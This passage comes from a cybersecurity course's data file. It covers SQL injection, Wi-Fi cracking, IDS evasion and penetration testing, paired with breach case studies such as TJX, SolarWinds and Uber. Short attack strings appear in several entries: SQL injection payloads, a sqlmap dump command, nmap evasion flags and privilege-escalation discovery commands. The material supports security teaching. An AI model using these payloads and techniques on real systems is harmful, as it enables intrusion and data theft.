        topicName: "SQL Injection Fundamentals & Mechanics",
        studentAnalogy: "Writing your name on a college form as 'Kapil; DROP TABLE Attendance; --' so when the administrative computer reads your form, it deletes the entire student attendance record.",
        industryUseCase: "SQLi occurs when untrusted user input is directly concatenated into SQL query strings, allowing attackers to manipulate the query logic, execute arbitrary database commands, and dump tables."
      },
      {
        topicName: "In-Band SQLi: UNION-Based & Error-Based",
        studentAnalogy: "Asking a librarian for a book, and when they say 'Book not found on shelf 4 where admin passwords are kept', you use their detailed error message to discover where the secrets live.",
        industryUseCase: "`UNION SELECT` combines results from the original query with results from attacker-controlled queries, allowing attackers to display sensitive database records directly on the web page."
      },
      {
        topicName: "Blind SQLi: Boolean-Based & Time-Based",
        studentAnalogy: "Playing 20 Questions with a guard who can only nod yes or shake their head no; if the first letter of the password is 'a', the guard waits 5 seconds before nodding.",
        industryUseCase: "When web pages do not display database output or errors, testers use conditional sleep queries (`'; IF (1=1) WAITFOR DELAY '0:0:5'--`) to extract databases character-by-character based on server response latency."
      },
      {
        topicName: "Automated Exploitation with Sqlmap",
        studentAnalogy: "A robotic lockpick that automatically identifies the lock manufacturer, tests 500 different key blanks, picks the lock, and photocopies all confidential files in 2 minutes.",
        industryUseCase: "`sqlmap -u 'http://target/item.php?id=1' --dbs --dump` automatically detects injection points, identifies the database type (MySQL/PostgreSQL/Oracle/MSSQL), and extracts schemas and data."
      },
      {
        topicName: "Defenses: Prepared Statements & Parameterized Queries",
        studentAnalogy: "Using a coin slot machine that only accepts round 5-rupee metal coins; if you try to insert paper notes, cardboard, or wire, it physically cannot enter the mechanism.",
        industryUseCase: "Parameterized queries ensure the database engine treats user input strictly as literal data, never as executable SQL code, completely eliminating SQL injection risks regardless of input content."
      }
    ]
  },
  13: {
    caseStudy: {
      title: "TJX Companies 2007 WEP Parking Lot Wi-Fi Intrusion",
      incidentYear: "2007",
      targetEntity: "TJX Companies (T.J. Maxx, Marshalls)",
      summary: "Albert Gonzalez and his accomplices sat in a car in the parking lot of a Marshalls department store in Miami, using directional antennas to intercept the store's wireless network. The network was protected by broken 1999 WEP (Wired Equivalent Privacy) encryption. They cracked the WEP key in minutes, pivoted onto the corporate payment transaction network, and stole 45.7 million payment card numbers.",
      rootCause: "Relying on deprecated, cryptographically broken WEP encryption; lack of mutual authentication on corporate wireless access points; failure to isolate point-of-sale card readers from guest/store Wi-Fi.",
      defenseTakeaway: "Permanently retire WEP and original WPA; deploy WPA3-Enterprise or WPA2-Enterprise with 802.1X EAP-TLS certificate-based authentication; isolate wireless access points from corporate payment cardholder environments (CDE)."
    },
    topicBreakdowns: [
      {
        topicName: "Wi-Fi Encryption Evolution: WEP vs WPA vs WPA2 vs WPA3",
        studentAnalogy: "WEP is a flimsy plastic bicycle lock that can be snipped with kitchen scissors; WPA2 is a hardened steel chain; WPA3 is a biometric fingerprint padlock with self-destruct alarms.",
        industryUseCase: "WEP uses weak 24-bit initialization vectors (IVs) that duplicate rapidly; WPA2 uses AES-CCMP with 4-way handshake vulnerability; WPA3 uses Simultaneous Authentication of Equals (SAE) resistant to offline cracking."
      },
      {
        topicName: "The WPA/WPA2 4-Way Handshake & Capture Mechanics",
        studentAnalogy: "Two students shaking hands in a secret rhythm: an eavesdropper records the sound of their clapping and practices at home with a dictionary of secret rhythms until they find the matching song.",
        industryUseCase: "When a wireless device joins an access point, a 4-way EAPOL handshake verifies both sides know the Pre-Shared Key (PSK) without sending the password across the airwaves; capturing this handshake enables offline brute forcing."
      },
      {
        topicName: "Aircrack-ng Suite (airmon-ng, airodump-ng, aireplay-ng)",
        studentAnalogy: "Putting your radio antenna on scan mode to hear every walkie-talkie channel in the stadium, then sending a loud beep to make two guards reconnect their headsets.",
        industryUseCase: "The Aircrack-ng suite enables wireless card monitor mode (`airmon-ng`), captures air packets (`airodump-ng`), deauthenticates connected clients to force handshakes (`aireplay-ng`), and cracks PSK hashes (`aircrack-ng`)."
      },
      {
        topicName: "Rogue Access Points & The Evil Twin Attack",
        studentAnalogy: "Setting up a free coffee stand with the exact same college logo right in front of the campus cafe and asking students to write their name and PIN to get 'Free Campus Wi-Fi'.",
        industryUseCase: "Attackers deploy an access point broadcasting the identical SSID (e.g. 'Starbucks_Guest') with stronger signal strength, enticing victim laptops to roam over, where the attacker sniffs all unencrypted traffic."
      },
      {
        topicName: "Enterprise Wi-Fi Security (802.1X, EAP-TLS, RADIUS)",
        studentAnalogy: "Instead of one shared room key that all 200 students know, every student must swipe their individual biometric campus ID card at the electronic front turnstile.",
        industryUseCase: "Enterprises mandate WPA2/WPA3-Enterprise backed by RADIUS servers and digital client certificates (EAP-TLS), completely eliminating pre-shared passwords and offline dictionary cracking risks."
      }
    ]
  },
  14: {
    caseStudy: {
      title: "SolarWinds 2020 SUNBURST Steganographic Evasion & Supply Chain Hack",
      incidentYear: "2020",
      targetEntity: "SolarWinds Orion, US Government Depts, Microsoft, FireEye",
      summary: "Russian state-sponsored threat actors (APT29 / Cozy Bear) breached SolarWinds' build pipeline and inserted a backdoor named SUNBURST into official, digitally signed software updates. Once installed, the malware lay completely dormant for two weeks to evade sandbox analysis, checked for security analysis tools, disguised its network beacons as legitimate Orion network monitoring traffic, and stole sensitive federal secrets.",
      rootCause: "Compromised continuous integration/continuous deployment (CI/CD) build server; failure to verify cryptographic hash discrepancies between source code and compiled binaries; trusting signed updates without behavioural anomaly analysis.",
      defenseTakeaway: "Implement multi-signature reproducible builds; enforce zero-trust behavioral network egress monitoring; assume third-party vendor updates can be weaponized; isolate build environments from internet access."
    },
    topicBreakdowns: [
      {
        topicName: "How Intrusion Detection Systems (IDS/IPS) Work",
        studentAnalogy: "A security guard with a photo album of known campus trouble-makers (Signature-based), who also blows a whistle if anyone suddenly runs down the hallway at 100 km/h (Anomaly-based).",
        industryUseCase: "Network IDS (like Snort or Suricata) analyze network traffic against thousands of rules (signatures) and alert on anomalies, while IPS active inline engines block offending packets in real-time."
      },
      {
        topicName: "Evasion Techniques: Packet Fragmentation & Decoy Scanning",
        studentAnalogy: "Sneaking a large banner into a stadium by cutting it into 20 small puzzle pieces across 20 friends' backpacks, then taping them together once inside the grandstand.",
        industryUseCase: "Nmap flag `-f` fragments probe packets into tiny 8-byte chunks that pass through older packet inspection engines without matching signature inspection buffers; `-D` mixes real probes among fake decoy IPs."
      },
      {
        topicName: "Proxychains, Tor & Multi-Hop Anonymization",
        studentAnalogy: "Sending a postcard through 5 different friends in 5 different countries, each putting it in a new blank envelope, so the final recipient has no idea who wrote the original letter.",
        industryUseCase: "Pentesters route terminal tool traffic through chained SOCKS4/5 proxies or the Tor onion network (`proxychains nmap ...`) to assess defenses from diverse geographic origins and hide testing IPs."
      },
      {
        topicName: "Honeypots & Deception Technology (Kippo, Cowrie)",
        studentAnalogy: "Placing a fake fake wallet filled with Monopoly money and a GPS tracker on a library table to see who tries to steal it.",
        industryUseCase: "Enterprises deploy low- and high-interaction honeypots disguised as vulnerable servers to detect internal lateral movement, study adversary techniques, and trigger high-fidelity alerts."
      },
      {
        topicName: "Encrypted C2 Channels & Protocol Tunneling (DNS/ICMP)",
        studentAnalogy: "Writing a secret message in Morse code by tapping your pencil on the table during an exam rather than whispering out loud.",
        industryUseCase: "Adversaries and Red Teams tunnel outbound command-and-control communication through permitted protocol channels like DNS queries (DNS tunneling) or ICMP ping payloads to evade egress perimeter firewalls."
      }
    ]
  },
  15: {
    caseStudy: {
      title: "Uber 2022 Internal Secrets & Slack Takeover",
      incidentYear: "2022",
      targetEntity: "Uber Technologies Inc.",
      summary: "An 18-year-old hacker targeted an external Uber contractor via WhatsApp MFA fatigue (bombarding them with push notifications and messaging on WhatsApp posing as IT support). Once inside the internal network, the hacker scanned internal file shares and found an unencrypted PowerShell script containing hardcoded credentials for a high-privilege Thycotic Privileged Access Management (PAM) admin account, yielding master access to Uber's AWS, GCP, Duo, HackerOne, and Slack environments.",
      rootCause: "Human vulnerability to MFA exhaustion fatigue; hardcoded administrative credentials stored in plaintext PowerShell automation scripts on open network shares; lack of PAM secret rotation.",
      defenseTakeaway: "Mandate number-matching or FIDO2 hardware tokens for MFA; deploy automated static secrets scanners (like GitGuardian/TruffleHog) to prevent hardcoded credentials in scripts and shares; strictly enforce PAM least privilege."
    },
    topicBreakdowns: [
      {
        topicName: "Penetration Testing Execution Standard (PTES)",
        studentAnalogy: "Following the strict official flight pre-check checklist that an airline pilot must execute before, during, and after every commercial flight.",
        industryUseCase: "PTES standardizes penetration testing into 7 structured phases: Pre-engagement -> Intelligence Gathering -> Threat Modeling -> Vulnerability Analysis -> Exploitation -> Post Exploitation -> Comprehensive Reporting."
      },
      {
        topicName: "Privilege Escalation: Linux SUID & Windows Token Impersonation",
        studentAnalogy: "A student finding the master maintenance key in the campus basement that accidentally unlocks the server room, principal's office, and exam storage vault.",
        industryUseCase: "After landing a low-privilege shell, testers audit misconfigured SUID binaries (`find / -perm -u=s`), sudo privileges (`sudo -l`), and unquoted service paths to elevate from `www-data` to `root` or `SYSTEM`."
      },
      {
        topicName: "Post-Exploitation & Lateral Movement (BloodHound, Mimikatz)",
        studentAnalogy: "Once inside one student's hostel room, discovering a secret hallway map that reveals which doors connect to the roof and the central campus network hub.",
        industryUseCase: "BloodHound maps Active Directory attack paths using graph theory, showing penetration testers the exact sequence of ACL abuses needed to pivot from a standard domain user to Domain Admin."
      },
      {
        topicName: "Executive Summary vs Technical Finding Authoring",
        studentAnalogy: "Writing a 1-page summary for the college president explaining why the server crashed in plain language, accompanied by a 20-page technical appendix for the network engineers.",
        industryUseCase: "A professional pentest report features an Executive Summary translating technical risks into business impact (revenue risk, regulatory compliance) followed by detailed reproducible technical steps and CVSS ratings."
      },
      {
        topicName: "Remediation Guidance & Re-Testing Protocol",
        studentAnalogy: "A certified building inspector checking structural cracks, writing an exact repair blueprint for the mason, and coming back 30 days later to certify that the wall is completely reinforced.",
        industryUseCase: "Ethical hacking concludes with practical, defensible remediation blueprints and a formal re-testing verification phase to confirm all discovered critical and high vulnerabilities are definitively closed."
      }
    ]
  }
};
